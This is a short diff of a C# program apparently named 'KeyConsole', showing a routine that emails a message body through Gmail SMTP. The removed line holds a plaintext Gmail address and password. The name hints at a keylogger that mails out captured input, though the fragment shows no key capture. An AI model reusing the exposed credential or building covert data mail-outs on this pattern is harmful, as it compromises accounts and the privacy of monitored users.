@@ -66,7 +66,7 @@ namespace KeyConsole
             mailMessage.To.Add("petrnovak7100@gmail.com");
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
-            client.Credentials = new System.Net.NetworkCredential("petrnovak7100@gmail.com", "bagrbagrbagr");
+            client.Credentials = new System.Net.NetworkCredential("petrnovak7100@gmail.com", Pass.Password);
             mailMessage.Body = emailBody;
             client.Send(mailMessage);
         }
